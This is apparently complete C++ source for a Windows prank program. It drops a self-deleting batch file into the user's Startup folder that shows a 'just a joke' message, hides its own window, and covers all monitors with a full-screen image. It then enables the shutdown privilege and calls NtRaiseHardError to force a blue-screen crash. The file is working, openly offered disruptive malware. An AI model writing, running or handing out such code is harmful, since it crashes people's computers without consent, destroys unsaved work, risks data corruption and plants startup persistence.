#include <Windows.h>
#include <winternl.h>
#include <powrprof.h>
#include <fstream>
#include <shlobj.h>
#include <gdiplus.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "powrprof.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

#undef OptionShutdownSystem

enum _HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
};

typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID*, enum _HARDERROR_RESPONSE_OPTION, PULONG);
typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

Image* g_pImage = NULL;
HWND* g_hwnds = NULL;
int g_screens = 0;

LRESULT CALLBACK ImageWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        RECT rc;
        GetClientRect(hWnd, &rc);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, rc.right - rc.left, rc.bottom - rc.top);
        SelectObject(hdcMem, hbm);
        FillRect(hdcMem, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
        if (g_pImage) {
            Graphics gr(hdcMem);
            gr.DrawImage(g_pImage, 0, 0, rc.right - rc.left, rc.bottom - rc.top);
        }
        BitBlt(hdc, 0, 0, rc.right - rc.left, rc.bottom - rc.top, hdcMem, 0, 0, SRCCOPY);
        DeleteDC(hdcMem);
        DeleteObject(hbm);
        EndPaint(hWnd, &ps);
        break;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}

void ShowImage() {
    ULONG_PTR gdiToken;
    GdiplusStartupInput gdiInput;
    GdiplusStartup(&gdiToken, &gdiInput, NULL);

    g_pImage = Image::FromFile(L"assets/asset.jpg", FALSE);

    HINSTANCE hInst = GetModuleHandle(NULL);
    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = ImageWndProc;
    wc.hInstance = hInst;
    wc.hCursor = NULL;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"ImageScreenClass";
    RegisterClassW(&wc);

    g_screens = GetSystemMetrics(SM_CMONITORS);
    g_hwnds = new HWND[g_screens];

    for (int i = 0; i < g_screens; i++) {
        g_hwnds[i] = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"ImageScreenClass", L"",
            WS_POPUP, GetSystemMetrics(SM_XVIRTUALSCREEN), GetSystemMetrics(SM_YVIRTUALSCREEN),
            GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN),
            NULL, NULL, hInst, NULL);
        ShowWindow(g_hwnds[i], SW_SHOWMAXIMIZED);
    }
    ShowCursor(FALSE);

    Sleep(3000);

    for (int i = 0; i < g_screens; i++) {
        DestroyWindow(g_hwnds[i]);
    }
    ShowCursor(TRUE);
    delete[] g_hwnds;
    delete g_pImage;
    GdiplusShutdown(gdiToken);
}

void BlueScreen() {
    BOOLEAN bEnabled;
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);

    ULONG uResp;
    PVOID params[4] = { NULL };
    UNICODE_STRING uStr;
    RtlInitUnicodeString(&uStr, L"SYSTEM ERROR");
    params[0] = &uStr;
    params[1] = 0;
    params[2] = 0;
    params[3] = 0;

    NtRaiseHardError(0xC000021A, 4, 0, params, OptionShutdownSystem, &uResp);
}

void DropBat() {
    WCHAR startupPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    wcscat_s(startupPath, L"\\gol.bat");

    std::wofstream batFile(startupPath);
    batFile << L"@echo off\r\n";
    batFile << L"msg * \"This was just a joke\"\r\n";
    batFile << L"del \"%~f0\"\r\n";
    batFile.close();
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hWnd = CreateWindowExW(0, L"Static", L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
    ShowWindow(hWnd, SW_HIDE);

    DropBat();

    Sleep(12000);
    ShowImage();
    BlueScreen();
    return 0;
}
